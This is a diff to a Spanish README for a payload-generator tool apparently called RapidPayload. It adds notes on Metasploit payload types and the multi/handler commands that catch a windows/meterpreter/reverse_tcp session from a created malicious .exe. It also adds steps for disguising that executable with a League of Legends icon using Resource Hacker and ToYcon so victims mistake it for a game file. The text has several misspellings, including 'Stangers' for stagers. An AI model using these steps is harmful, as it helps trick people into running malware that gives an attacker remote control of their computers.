@@ -18,10 +18,29 @@ Todos los requerimientos que se necesitan los encontramos en Kali Linux, si se u
 
 El proceso de instalación es bastante simple, únicamente debemos correr los siguientes comandos en el orden que se muestran:
 
+### Tipos de Payloads
+* Singles: son unicos y completamente independientes. Pueden ser usadsos sin la necesidad de metasploit
+* Stangers: estos configuran una concexion de red entre el atacante y la victima. Son pequeños y confiables
+* Stages: son compenentes que se descargan por los modulos Stagers. Proporcionan funciones avanzadas como meterpreter, inyeccion VNC 
+
 ### Paso a paso 
 cd RapidPayload
 bash install.sh
 python3 RapidPayload.py
+
+### Dentro de metasploit y con el archivo .exe (malisioso) creada usar el siguiente comando 
+* use exploit/multi/handler
+* set payload windows/meterpreter/reverse_tcp
+* set lhost IP LOCAL 
+* set lport MISMO PUERTO DEL ARCHIVO MALISIOSO CREADO
+* options (para chequear)
+* exploit -j
+
+### Para el archivo malisioso
+* Con el programa **Resource Hacker** y con **ToYcon**
+* Buacar iconos o imagenes por ejemplo del juego LOL
+* Con ToYcon genero que esa foto sea un logo
+* Con Resource Hacker la uso para ponerla arriba del archivo malisioso
 
 Una vez que se ha instalado la herramienta entonces podremos mandarla a llamar y hacer uso de ella.
 
